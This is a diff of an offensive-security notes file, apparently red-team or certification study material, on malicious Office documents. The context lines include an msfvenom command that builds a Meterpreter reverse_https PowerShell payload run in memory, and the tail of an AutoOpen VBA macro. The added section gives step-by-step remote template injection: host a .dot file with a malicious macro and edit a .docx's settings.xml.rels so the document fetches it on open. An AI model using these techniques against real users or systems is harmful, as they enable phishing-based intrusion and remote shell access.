@@ -166,7 +166,7 @@ You can reduce detection even more if you open the file withn a tool like FlexHE
 &nbsp;
 <span style="font-size: 25px; color:white"><b>Powershell Shellcode Runner From VBA</b></span>
 
-Remember that Powershell is a <font style="color:#981f3a">64-bit</font> process (encode the payload as x64).
+Remember that Powershell is a <span style="color:red">64-bit</span> process (encode the payload as x64).
 Reverse shell to embed in .ps1 that runs directly in ram.
 ```powershell
 msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 EXITFUNC=thread -f ps1
@@ -327,3 +327,15 @@ Sub AutoOpen()
 	MyMacro
 End Sub
 ```
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Remote Template Injection</b></span>
+You can create a normal document <span style="color:red">.docx</span> and point it to use an arbitrary template <span style="color:red">.dot</span> that contains a malicious macro.
+- Create the .dot containing the malicious macro and host it on a website to then download.
+- Create the .docx with whatever.
+- Open the .docx with <span style="color:red">7z</span> and navigate into <span style="color:red">_rels/settings.xml.rels</span> and select edit.
+- Scroll and change the Target="something" with Target="<URL_TO_FILE.dot>"
+- &nbsp;
+Consider using [remoteInjector.py](https://github.com/JohnWoodman/remoteinjector) to automate the process.
